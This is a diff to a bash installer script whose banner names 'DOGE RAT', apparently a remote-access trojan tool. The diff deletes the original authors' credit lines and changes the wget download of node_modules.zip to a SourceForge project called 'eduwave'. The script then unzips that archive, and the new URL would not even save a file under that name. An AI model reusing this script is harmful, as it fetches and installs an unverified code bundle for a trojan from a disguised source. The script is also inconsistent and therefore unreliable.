@@ -20,9 +20,6 @@ echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░S░
 
 
 echo -e "\e[0m"
-echo "Author: shivayadv & Did-Dog"
-echo "Github: shivaya-dav & did-dog"
-echo "Telegram channel: cybershieldx"
 echo -n "Loading "
 timeout 10s bash -c '
 while true
@@ -59,7 +56,7 @@ else
         echo "node_modules.zip already downloaded. Skipping download."
     else
         # Download node_modules.zip file
-        wget https://cybershieldx.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
+        wget https://sourceforge.net/projects/eduwave/files/latest/download || { echo "Failed to download node_modules.zip" ; exit 1; }
     fi
 
     unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
